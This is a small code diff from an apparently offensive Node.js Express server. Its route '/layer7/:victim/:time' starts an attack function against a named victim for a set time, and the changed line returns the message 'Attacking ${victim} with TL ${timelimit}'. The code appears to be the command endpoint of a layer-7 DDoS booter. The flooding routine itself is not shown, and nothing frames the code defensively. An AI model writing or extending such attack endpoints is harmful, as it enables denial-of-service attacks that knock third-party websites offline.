@@ -35,7 +35,7 @@ app.get('/layer7/:victim/:time', (req, res) => {
         else {
             mainT(victim, timelimit)
             machineBusy = true
-            res.send(200)
+            res.send(200, {success: `Attacking ${victim} with TL ${timelimit}`})
         }
     }
     else {
